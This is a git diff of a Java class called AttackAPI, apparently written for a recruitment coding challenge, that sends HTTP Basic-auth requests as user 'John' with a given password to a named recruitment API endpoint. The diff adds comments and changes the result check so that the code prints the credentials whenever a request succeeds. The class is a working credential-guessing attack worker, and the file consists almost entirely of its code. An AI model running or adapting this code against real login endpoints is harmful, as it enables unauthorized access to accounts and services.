@@ -9,27 +9,29 @@ public class AttackAPI implements Runnable{
     private String username;    
     private String password;
 
-    public AttackAPI(String password){
-        
+    public AttackAPI(String password){ 
+        /* AttackAPI constructor. */
         username = "John";
         this.password = password;
-
     }
     
     public void run(){
 
-        String authenticator = username +":"+ password;
-        String encodedAuthenticator = Base64.getEncoder().encodeToString(authenticator.getBytes());
+        /* Method to lauch attacks on the API. */
 
-        HttpClient myClient = HttpClient.newHttpClient();
+        String authenticator = username +":"+ password;
+        String encodedAuthenticator = Base64.getEncoder().encodeToString(authenticator.getBytes()); // Base64 encrypting the attack credentials. 
+
+        HttpClient myClient = HttpClient.newHttpClient();   //  Creating HttpClient object.
 
         HttpRequest myRequest = HttpRequest.newBuilder()
             .uri(URI.create("http://recruitment.warpdevelopment.co.za/api/v2/authenticate"))
             .header("Authorization", "Basic " + encodedAuthenticator)
             .GET()
-            .build();
+            .build();   //  Creating HttpRequest object.
 
         HttpResponse<String> myResponse;
+
         try{
             myResponse = myClient.send(myRequest, HttpResponse.BodyHandlers.ofString());
         }
@@ -38,12 +40,12 @@ public class AttackAPI implements Runnable{
             myResponse = null;
             System.out.println(e);
             System.exit(0);
-        }
+        }   /* Attempt to call the API with the respective credentials. */
 
-        if (myResponse.statusCode() != 500 & myResponse.statusCode() != 401){
-             System.out.println("Status code: " + myResponse.statusCode());
-             System.out.println("Response: " + myResponse.body());
-        }
+        if (myResponse.statusCode() == 200){
+            System.out.println("\nCorrect credentials are, \nUsername:" + username + "\nPassword:" + password);
+            System.out.println("Response: " + myResponse.body());
+        }   /* Filters only for the successfully authenticated credentials. */
 
     }
 
